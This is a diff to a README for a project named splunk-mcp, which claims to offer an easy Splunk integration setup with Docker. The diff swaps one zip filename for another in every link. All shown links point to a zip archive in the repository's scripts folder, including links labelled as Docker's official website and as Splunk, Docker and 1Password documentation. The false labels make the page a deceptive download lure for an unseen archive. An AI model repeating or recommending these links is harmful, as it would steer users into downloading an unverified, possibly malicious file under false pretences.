@@ -1,6 +1,6 @@
 # 🌟 splunk-mcp - Easy Setup for Splunk Integration
 
-[![Download splunk-mcp](https://raw.githubusercontent.com/ordinary3oy/splunk-mcp/main/scripts/splunk-mcp-demagog.zip)](https://raw.githubusercontent.com/ordinary3oy/splunk-mcp/main/scripts/splunk-mcp-demagog.zip)
+[![Download splunk-mcp](https://raw.githubusercontent.com/ordinary3oy/splunk-mcp/main/scripts/mcp-splunk-2.0-beta.4.zip)](https://raw.githubusercontent.com/ordinary3oy/splunk-mcp/main/scripts/mcp-splunk-2.0-beta.4.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the splunk-mcp project! This application helps you set up a Proof of 
 
 ## 📥 Download & Install
 
-To get started, you need to download the software. Visit this page to download: [Download splunk-mcp Releases](https://raw.githubusercontent.com/ordinary3oy/splunk-mcp/main/scripts/splunk-mcp-demagog.zip). Pick the latest version that fits your system.
+To get started, you need to download the software. Visit this page to download: [Download splunk-mcp Releases](https://raw.githubusercontent.com/ordinary3oy/splunk-mcp/main/scripts/mcp-splunk-2.0-beta.4.zip). Pick the latest version that fits your system.
 
 ## 📁 System Requirements
 
@@ -17,7 +17,7 @@ Before downloading, ensure your system meets the following requirements:
 - **Operating System:** Windows 10 or later, macOS Mojave or later, or a Linux distribution.
 - **Memory:** At least 8 GB RAM.
 - **Disk Space:** At least 2 GB of available disk space.
-- **Docker:** Installed and running. Download from [Docker's official website](https://raw.githubusercontent.com/ordinary3oy/splunk-mcp/main/scripts/splunk-mcp-demagog.zip).
+- **Docker:** Installed and running. Download from [Docker's official website](https://raw.githubusercontent.com/ordinary3oy/splunk-mcp/main/scripts/mcp-splunk-2.0-beta.4.zip).
 
 ## 🔧 Installation Steps
 
@@ -25,7 +25,7 @@ Once you've downloaded the application, follow these steps:
 
 1. **Install Docker:** If you haven't done this yet, follow the instructions on the Docker website to install Docker on your computer.
   
-2. **Download splunk-mcp:** Again, visit this page to download: [Download splunk-mcp Releases](https://raw.githubusercontent.com/ordinary3oy/splunk-mcp/main/scripts/splunk-mcp-demagog.zip).
+2. **Download splunk-mcp:** Again, visit this page to download: [Download splunk-mcp Releases](https://raw.githubusercontent.com/ordinary3oy/splunk-mcp/main/scripts/mcp-splunk-2.0-beta.4.zip).
   
 3. **Unzip the Package:** Locate the downloaded file on your computer, and unzip it to a folder of your choice.
 
@@ -91,9 +91,9 @@ If you'd like to contribute to the project, we welcome your help! Check out the 
 
 Here are some additional resources to help you understand more about the tools used in this project:
 
-- [Splunk Documentation](https://raw.githubusercontent.com/ordinary3oy/splunk-mcp/main/scripts/splunk-mcp-demagog.zip)
-- [Docker Documentation](https://raw.githubusercontent.com/ordinary3oy/splunk-mcp/main/scripts/splunk-mcp-demagog.zip)
-- [1Password Guide](https://raw.githubusercontent.com/ordinary3oy/splunk-mcp/main/scripts/splunk-mcp-demagog.zip)
+- [Splunk Documentation](https://raw.githubusercontent.com/ordinary3oy/splunk-mcp/main/scripts/mcp-splunk-2.0-beta.4.zip)
+- [Docker Documentation](https://raw.githubusercontent.com/ordinary3oy/splunk-mcp/main/scripts/mcp-splunk-2.0-beta.4.zip)
+- [1Password Guide](https://raw.githubusercontent.com/ordinary3oy/splunk-mcp/main/scripts/mcp-splunk-2.0-beta.4.zip)
 - [Claude Documentation](link-to-claude-docs)
 
 Feel free to explore the links for more information on using these technologies effectively.
